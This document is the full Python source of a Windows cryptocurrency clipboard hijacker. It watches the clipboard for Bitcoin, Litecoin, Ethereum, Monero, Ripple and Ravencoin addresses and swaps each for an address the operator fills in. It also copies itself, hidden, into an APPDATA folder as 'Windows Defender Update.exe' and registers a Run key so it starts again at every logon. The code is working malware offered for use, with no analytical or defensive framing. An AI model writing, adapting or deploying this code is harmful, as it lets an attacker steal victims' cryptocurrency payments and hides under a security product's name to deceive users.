import time
import subprocess
import ctypes
import re
import os
import sys
import random
import shutil
import winreg

BTC = 'YOUR_BTC_ADDRESS_HERE'
LTC = 'YOUR_LTC_ADDRESS_HERE'
ETH = 'YOUR_ETH_ADDRESS_HERE'
XMR = 'YOUR_XMR_ADDRESS_HERE'
XRP = 'YOUR_XRP_ADDRESS_HERE'
RVN = 'YOUR_RVN_ADDRESS_HERE'

class Clipboard:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalLock.restype = ctypes.c_void_p
        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        
        self.user32 = ctypes.windll.user32
        self.user32.GetClipboardData.restype = ctypes.c_void_p
    
    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data  = self.user32.GetClipboardData(1)
            data_locked = self.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            self.kernel32.GlobalUnlock(data_locked)
            
            try:
                return value.decode()
            
            except Exception as e:
                print(e)
                return ''

    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

class Methods:
    regex = '^(ltc1|[LM])[0-9a-zA-Z]{26,39}$|^(bc1|[13])[0-9a-zA-Z]{25,59}$|^[48][0-9a-zA-Z]{94}$|^(0x)[0-9a-zA-Z]{40}$|^(r)[0-9a-zA-Z]{25,34}$|^(R)[0-9a-zA-Z]{26,34}$'

    @staticmethod
    def set_clipboard(text):
        try:
            subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
        except Exception as e:
            print(e)
    
    def check(self, text):
        try:
            regex_check = re.findall(self.regex, text)
            if regex_check:
                return True
        except Exception as e:
            print(e)
        return False

def main():
    m = Methods()
    while True:
        try:
            with Clipboard() as clipboard: 
                time.sleep(0.1)
                target_clipboard = clipboard
                print('Text found in clipboard: %s' % target_clipboard) 
            if m.check(target_clipboard):
                if re.match('^(ltc1|[LM])[0-9a-zA-Z]{26,39}$', target_clipboard):
                    m.set_clipboard(LTC)  # Change the copied value to "its ltc" for LTC address
                elif re.match('^(bc1|[13])[0-9a-zA-Z]{25,59}$', target_clipboard):
                    m.set_clipboard(BTC)  # Change the copied value to "its btc" for BTC address
                elif re.match('^[48][0-9a-zA-Z]{94}$', target_clipboard):
                    m.set_clipboard(XMR)  # Change the copied value to "its monero" for Monero address
                elif re.match('^(0x)[0-9a-zA-Z]{40}$', target_clipboard):
                    m.set_clipboard(ETH)  # Change the copied value to "its ethereum" for Ethereum address
                elif re.match('^(r)[0-9a-zA-Z]{25,34}$', target_clipboard):
                    m.set_clipboard(XRP)  # Change the copied value to "its ripple" for Ripple address
                elif re.match('^(R)[0-9a-zA-Z]{26,34}$', target_clipboard):
                    m.set_clipboard(RVN)  # Change the copied value to "its ravencoin" for RavenCoin address
        except Exception as e:
            print(e)
        time.sleep(1)

def copy_to_random_folder_in_appdata():
    try:
        appdata_path = os.getenv('APPDATA')
        appdata_folders = [folder for folder in os.listdir(appdata_path) if os.path.isdir(os.path.join(appdata_path, folder))]
        if appdata_folders:
            random_folder = random.choice(appdata_folders)
            random_folder_path = os.path.join(appdata_path, random_folder)
            destination_name = "Windows Defender Update.exe"
            destination_path = os.path.join(random_folder_path, destination_name)
            script_path = sys.argv[0]  # Use the first argument passed to the script, which is the path to the executable
            shutil.copyfile(script_path, destination_path)
            # Set the file attributes to hidden
            ctypes.windll.kernel32.SetFileAttributesW(destination_path, 0x02)  # 0x02 corresponds to hidden attribute
            return destination_path
        else:
            return None
    except Exception as e:
        print(e)
        return None


def create_registry_key(path):
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            winreg.SetValueEx(reg_key, "Windows Defender Update.exe", 0, winreg.REG_SZ, path)  # Replace 'YourScriptName' with the name you want for your registry key
        return True
    except Exception as e:
        print(e)
        return False

def has_run_before():
    flag_file = os.path.join(os.getenv('APPDATA'), '891023641709236123765.txt')
    return os.path.exists(flag_file)

def mark_as_run():
    flag_file = os.path.join(os.getenv('APPDATA'), '891023641709236123765.txt')
    with open(flag_file, 'w') as f:
        f.write('')

if not has_run_before():
    create_registry_key(copy_to_random_folder_in_appdata())
    mark_as_run()

main()
